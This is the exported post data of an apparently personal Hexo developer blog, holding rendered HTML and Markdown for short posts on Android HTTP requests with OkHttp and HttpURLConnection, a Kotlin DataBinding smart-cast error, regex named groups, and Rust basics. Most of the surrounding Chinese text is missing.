class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span>requestBody<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">// </span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// OKHttp</span>\n<span class=\"token comment\">// HttpUrlConnection</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">okHttpPull</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    coroutineScope<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>IO<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">val</span> client <span class=\"token operator\">=</span> <span class=\"token function\">OkHttpClient</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> request <span class=\"token operator\">=</span> Request<span class=\"token punctuation\">.</span><span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://www.baidu.com\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> response <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span><span class=\"token function\">newCall</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span>body<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">withContext</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>Main<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    binding<span class=\"token punctuation\">.</span>responseText<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> <span class=\"token keyword\">data</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> Exception<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// HttpURLConnection</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">httpUrlConnectionPost</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> connection<span class=\"token operator\">:</span> HttpURLConnection<span class=\"token operator\">?</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span>\n    <span class=\"token comment\">//  connection</span>\n    connection<span class=\"token operator\">!!</span><span class=\"token punctuation\">.</span>requestMethod <span class=\"token operator\">=</span> <span class=\"token string\">\"POST\"</span>\n    <span class=\"token keyword\">val</span> output <span class=\"token operator\">=</span> <span class=\"token function\">DataOutputStream</span><span class=\"token punctuation\">(</span>connection<span class=\"token punctuation\">.</span>outputStream<span class=\"token punctuation\">)</span>\n    output<span class=\"token punctuation\">.</span><span class=\"token function\">writeBytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username=admin&amp;password=123456\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// HttpURLConnection</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">httpUrlConnectionPull</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// Dispatchers.IO</span>\n    coroutineScope<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>IO<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">var</span> connection<span class=\"token operator\">:</span> HttpURLConnection<span class=\"token operator\">?</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">val</span> response <span class=\"token operator\">=</span> <span class=\"token function\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> url <span class=\"token operator\">=</span> <span class=\"token function\">URL</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://www.baidu.com\"</span><span class=\"token punctuation\">)</span>\n            connection <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">openConnection</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> HttpURLConnection\n            connection<span class=\"token punctuation\">.</span>connectTimeout <span class=\"token operator\">=</span> <span class=\"token number\">8000</span>\n            connection<span class=\"token punctuation\">.</span>readTimeout <span class=\"token operator\">=</span> <span class=\"token number\">8000</span>\n            <span class=\"token keyword\">val</span> input <span class=\"token operator\">=</span> connection<span class=\"token punctuation\">.</span>inputStream\n            <span class=\"token keyword\">val</span> reader <span class=\"token operator\">=</span> <span class=\"token function\">BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token function\">InputStreamReader</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            reader<span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span>\n                reader<span class=\"token punctuation\">.</span><span class=\"token function\">forEachLine</span> <span class=\"token punctuation\">&#123;</span>\n                    response<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span>it<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token comment\">// Dispatcher.IO</span>\n            <span class=\"token function\">withContext</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>Main<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                binding<span class=\"token punctuation\">.</span>responseText<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> Exception<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">finally</span> <span class=\"token punctuation\">&#123;</span>\n            connection<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">disconnect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n"},{"title":"DataBinding","date":"2021-11-21T16:00:00.000Z","author":"","hide":false,"summary":"DataBindingKotlinsmart cast, IDE","_content":"\n# DataBinding\n\nDataBindingViewBindingDataBindingViewBinding\n\nDataBindingMVVMAndroid\n\n\n\n> DataBindingKotlinsmart cast, IDE\n\nactivity_login.xml\n\n~~~xml\n    <data>\n        <variable\n            name=\"viewModel\"\n            type=\"kim.bifrost.coldrain.wanandroid.viewmodel.LoginViewModel\" />\n    </data>\n~~~\n\n\n\n~~~kotlin\nbinding.viewModel.postLogin()\n~~~\n\nIDE\n\n~~~\ne: E:\\ColdRain_Moro\\AndroidProject\\WanAndroid\\app\\src\\main\\java\\kim\\bifrost\\coldrain\\wanandroid\\view\\activity\\LoginActivity.kt: (31, 13): Smart cast to 'LoginViewModel' is impossible, because 'binding.viewModel' is a complex expression\n~~~\n\n ([KotlinSmart Cast - Javaer101](https://www.javaer101.com/article/52202734.html))\n\nviewModelLoginViewModel?LoginViewModelLoginViewModel?smart castLoginViewModel\n\n?\n\n~~~kotlin\nbinding.viewModel?.postLogin()\n~~~\n\nAndroid Studio\n\n","source":"_posts/problem-databinding.md","raw":"---\ntitle: DataBinding\ndate: 2021-11-22\nauthor: \nhide: false\nsummary: DataBindingKotlinsmart cast, IDE\ncategories: \ntags:\n  - Android\n  - Kotlin\n---\n\n# DataBinding\n\nDataBindingViewBindingDataBindingViewBinding\n\nDataBindingMVVMAndroid\n\n\n\n> DataBindingKotlinsmart cast, IDE\n\nactivity_login.xml\n\n~~~xml\n    <data>\n        <variable\n            name=\"viewModel\"\n            type=\"kim.bifrost.coldrain.wanandroid.viewmodel.LoginViewModel\" />\n    </data>\n~~~\n\n\n\n~~~kotlin\nbinding.viewModel.postLogin()\n~~~\n\nIDE\n\n~~~\ne: E:\\ColdRain_Moro\\AndroidProject\\WanAndroid\\app\\src\\main\\java\\kim\\bifrost\\coldrain\\wanandroid\\view\\activity\\LoginActivity.kt: (31, 13): Smart cast to 'LoginViewModel' is impossible, because 'binding.viewModel' is a complex expression\n~~~\n\n ([KotlinSmart Cast - Javaer101](https://www.javaer101.com/article/52202734.html))\n\nviewModelLoginViewModel?LoginViewModelLoginViewModel?smart castLoginViewModel\n\n?\n\n~~~kotlin\nbinding.viewModel?.postLogin()\n~~~\n\nAndroid Studio\n\n","slug":"problem-databinding","published":1,"updated":"2022-11-24T02:48:20.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtr0024sfklgnvq6hh0","content":"<h1 id=\"DataBinding\"><a href=\"#DataBinding\" class=\"headerlink\" title=\"DataBinding\"></a>DataBinding</h1><p>DataBindingViewBindingDataBindingViewBinding</p>\n<p>DataBindingMVVMAndroid</p>\n<p></p>\n<blockquote>\n<p>DataBindingKotlinsmart cast, IDE</p>\n</blockquote>\n<p>activity_login.xml</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>data</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>variable</span>\n        <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewModel<span class=\"token punctuation\">\"</span></span>\n        <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>kim.bifrost.coldrain.wanandroid.viewmodel.LoginViewModel<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>data</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\">binding<span class=\"token punctuation\">.</span>viewModel<span class=\"token punctuation\">.</span><span class=\"token function\">postLogin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>IDE</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">e: E:\\ColdRain_Moro\\AndroidProject\\WanAndroid\\app\\src\\main\\java\\kim\\bifrost\\coldrain\\wanandroid\\view\\activity\\LoginActivity.kt: (31, 13): Smart cast to 'LoginViewModel' is impossible, because 'binding.viewModel' is a complex expression<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p> (<a href=\"https://www.javaer101.com/article/52202734.html\">KotlinSmart Cast - Javaer101</a>)</p>\n<p>viewModelLoginViewModel?LoginViewModelLoginViewModel?smart castLoginViewModel</p>\n<p>?</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\">binding<span class=\"token punctuation\">.</span>viewModel<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">postLogin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>Android Studio</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"DataBinding\"><a href=\"#DataBinding\" class=\"headerlink\" title=\"DataBinding\"></a>DataBinding</h1><p>DataBindingViewBindingDataBindingViewBinding</p>\n<p>DataBindingMVVMAndroid</p>\n<p></p>\n<blockquote>\n<p>DataBindingKotlinsmart cast, IDE</p>\n</blockquote>\n<p>activity_login.xml</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>data</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>variable</span>\n        <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewModel<span class=\"token punctuation\">\"</span></span>\n        <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>kim.bifrost.coldrain.wanandroid.viewmodel.LoginViewModel<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>data</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\">binding<span class=\"token punctuation\">.</span>viewModel<span class=\"token punctuation\">.</span><span class=\"token function\">postLogin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>IDE</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">e: E:\\ColdRain_Moro\\AndroidProject\\WanAndroid\\app\\src\\main\\java\\kim\\bifrost\\coldrain\\wanandroid\\view\\activity\\LoginActivity.kt: (31, 13): Smart cast to &#39;LoginViewModel&#39; is impossible, because &#39;binding.viewModel&#39; is a complex expression<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p> (<a href=\"https://www.javaer101.com/article/52202734.html\">KotlinSmart Cast - Javaer101</a>)</p>\n<p>viewModelLoginViewModel?LoginViewModelLoginViewModel?smart castLoginViewModel</p>\n<p>?</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\">binding<span class=\"token punctuation\">.</span>viewModel<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">postLogin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>Android Studio</p>\n"},{"title":"Java/Kotlin","date":"2021-07-21T15:21:11.000Z","author":"","hide":false,"summary":"java","_content":"\n## \n\n\n\n```kotlin\nval pattern = Pattern.compile(\"(//d+)(//S+)\")\nval matcher = pattern.matcher(\"2021BifrostCraft\")\nif (matcher.find()) {\n    print(matcher.group())\n    print(matcher.group(1))\n    print(matcher.group(2))\n}\n// :2021BifrostCraft,2021,BifrostCraft\n```\n\nPattern\n\n\n\n\n\n## \n\n**?**\n\n\n\n```kotlin\nval pattern = Pattern.compile(\"(?<number>//d+)(?<word>//S+)\")\nval matcher = pattern.matcher(\"2021BifrostCraft\")\nif (matcher.find()) {\n    print(matcher.group())\n    print(matcher.group(\"number\"))\n    print(matcher.group(\"word\"))\n}\n// :2021BifrostCraft,2021,BifrostCraft\n```\n\npattern","source":"_posts/regex-matcher.md","raw":"---\ntitle: Java/Kotlin\ndate: 2021-07-21 23:21:11\nauthor: \nhide: false\nsummary: java\ncategories: \ntags:\n  - Kotlin\n  - Java\n---\n\n## \n\n\n\n```kotlin\nval pattern = Pattern.compile(\"(//d+)(//S+)\")\nval matcher = pattern.matcher(\"2021BifrostCraft\")\nif (matcher.find()) {\n    print(matcher.group())\n    print(matcher.group(1))\n    print(matcher.group(2))\n}\n// :2021BifrostCraft,2021,BifrostCraft\n```\n\nPattern\n\n\n\n\n\n## \n\n**?**\n\n\n\n```kotlin\nval pattern = Pattern.compile(\"(?<number>//d+)(?<word>//S+)\")\nval matcher = pattern.matcher(\"2021BifrostCraft\")\nif (matcher.find()) {\n    print(matcher.group())\n    print(matcher.group(\"number\"))\n    print(matcher.group(\"word\"))\n}\n// :2021BifrostCraft,2021,BifrostCraft\n```\n\npattern","slug":"regex-matcher","published":1,"updated":"2022-12-12T15:53:01.494Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jts0027sfkl9j2b3f4m","content":"<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> pattern <span class=\"token operator\">=</span> Pattern<span class=\"token punctuation\">.</span><span class=\"token function\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(//d+)(//S+)\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> matcher <span class=\"token operator\">=</span> pattern<span class=\"token punctuation\">.</span><span class=\"token function\">matcher</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2021BifrostCraft\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// :2021BifrostCraft,2021,BifrostCraft</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>Pattern</p>\n<p></p>\n<p></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong>?</strong></p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> pattern <span class=\"token operator\">=</span> Pattern<span class=\"token punctuation\">.</span><span class=\"token function\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(?&lt;number&gt;//d+)(?&lt;word&gt;//S+)\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> matcher <span class=\"token operator\">=</span> pattern<span class=\"token punctuation\">.</span><span class=\"token function\">matcher</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2021BifrostCraft\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"word\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// :2021BifrostCraft,2021,BifrostCraft</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>pattern</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> pattern <span class=\"token operator\">=</span> Pattern<span class=\"token punctuation\">.</span><span class=\"token function\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(//d+)(//S+)\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> matcher <span class=\"token operator\">=</span> pattern<span class=\"token punctuation\">.</span><span class=\"token function\">matcher</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2021BifrostCraft\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// :2021BifrostCraft,2021,BifrostCraft</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>Pattern</p>\n<p></p>\n<p></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong>?</strong></p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> pattern <span class=\"token operator\">=</span> Pattern<span class=\"token punctuation\">.</span><span class=\"token function\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(?&lt;number>//d+)(?&lt;word>//S+)\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> matcher <span class=\"token operator\">=</span> pattern<span class=\"token punctuation\">.</span><span class=\"token function\">matcher</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2021BifrostCraft\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>matcher<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"word\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// :2021BifrostCraft,2021,BifrostCraft</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>pattern</p>\n"},{"title":"Rust","date":"2022-05-18T16:00:00.000Z","author":"","hide":false,"summary":"&&&&","_content":"\n# Rust\n\n## \n\n>  `var a = \"hello world\"`  `a`  `\"hello world\"`  `a`  Rust  `let a = \"hello world\"` ****\n>\n>  Rust ****\n>\n>  Rust Course\n\n## \n\n~~~rust\nstruct Struct {\n    e: i32\n}\n\nfn main() {\n    let (a, b);\n\n    a = 1;\n    b = 2;\n    // \n    let [c,..,d,_] = [1, 2, 3, 4, 5];\n    // \n    let Struct { e, .. } = Struct { e: 5 };\n\n    assert_eq!([1, 2, 1, 4, 5], [a, b, c, d, e]);\n}\n~~~\n\n## (shadowing)\n\nRust \n\n```rust\nfn main() {\n    let x = 5;\n    // mainx\n    let x = x + 1;\n\n    {\n        // x\n        let x = x * 2;\n        println!(\"The value of x in the inner scope is: {}\", x);\n    }\n\n    println!(\"The value of x is: {}\", x);\n}\n```\n\n## \n\nkt\n\n~~~rust\nlet guess = \"42\".parse().except(\"Not a number\"); // parse\nlet guess: i32 = \"42\".parse().except(\"Not a number\"); // \nlet guess = \"42\".parse::<i32>().expect(\"Not a number!\"); // \n~~~\n\nrust::\n\n## \n\n> ## Rust \n>\n> Rust \n>\n> Rust \n>\n> - ****\n> - ****\n>\n> Rust  Rust `Result<T, E>` `panic!` \n>\n>  Rust Crouse\n\n`panic!``Result`Rusttry catch\n\nrustgojavakotlinResult API~\n\n~~~rust\n// expect  panic!\nlet guess = \"42\".parse::<i32>().expect(\"Not a number!\");\n\n// go\n// \nlet guess = \"42\".parse::<i32>();\nmatch guess {\n    Ok(num) => println!(\"You guessed: {}\", num),\n    Err(err) => println!(\"Error: {}\", err),\n}\n~~~\n\nrust`?`Result\n\n~~~rust\nuse core::time;\nuse std::{fs::OpenOptions, thread, io::Write};\n\nfn main() -> std::io::Result<()> {\n    let mut f = OpenOptions::new().write(true).open(\"hello.txt\")?; // <-\n    print!(\"{:?} 